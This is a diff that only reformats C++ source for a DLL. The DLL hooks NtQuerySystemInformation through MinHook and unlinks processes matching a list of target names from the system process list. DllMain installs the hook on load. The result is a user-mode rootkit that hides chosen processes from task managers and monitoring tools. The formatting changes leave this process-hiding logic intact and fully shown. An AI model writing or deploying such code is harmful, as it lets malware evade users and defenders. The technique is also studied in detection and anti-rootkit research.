@@ -2,15 +2,14 @@
 
 NTSTATUS WINAPI HookedNtQuerySystemInformation(
     SYSTEM_INFORMATION_CLASS SystemInformationClass,
-    PVOID                    SystemInformation,
-    ULONG                    SystemInformationLength,
-    PULONG                   ReturnLength
-)
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength)
 {
     NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
-        SystemInformation,
-        SystemInformationLength,
-        ReturnLength);
+                                                       SystemInformation,
+                                                       SystemInformationLength,
+                                                       ReturnLength);
 
     if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
     {
@@ -26,32 +25,45 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
             {
                 if (!wcsncmp(pNext->ImageName.Buffer, targetNames[i], pNext->ImageName.Length))
                 {
-                    if (0 == pNext->NextEntryOffset) { pCurrent->NextEntryOffset = 0; }
+                    if (0 == pNext->NextEntryOffset)
+                    {
+                        pCurrent->NextEntryOffset = 0;
+                    }
 
-                    else { pCurrent->NextEntryOffset += pNext->NextEntryOffset; }
+                    else
+                    {
+                        pCurrent->NextEntryOffset += pNext->NextEntryOffset;
+                    }
 
                     pNext = pCurrent;
                     break;
                 }
-            } 
+            }
         } while (pCurrent->NextEntryOffset != 0);
     }
 
     return status;
 }
 
-
 void InstallHook()
 {
-    if (MH_Initialize() != MH_OK) { return; }
+    if (MH_Initialize() != MH_OK)
+    {
+        return;
+    }
 
-    if (MH_CreateHookApi(L"ntdll", "NtQuerySystemInformation", reinterpret_cast<LPVOID*>(&HookedNtQuerySystemInformation), reinterpret_cast<LPVOID*>(&OriginalNtQuerySystemInformation)) != MH_OK) { return; }
+    if (MH_CreateHookApi(L"ntdll", "NtQuerySystemInformation", reinterpret_cast<LPVOID *>(&HookedNtQuerySystemInformation), reinterpret_cast<LPVOID *>(&OriginalNtQuerySystemInformation)) != MH_OK)
+    {
+        return;
+    }
 
-    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) { return; }
+    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
+    {
+        return;
+    }
 }
 
-
-BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
     switch (ul_reason_for_call)
     {
@@ -67,5 +79,3 @@ BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpRese
     }
     return TRUE;
 }
-
-
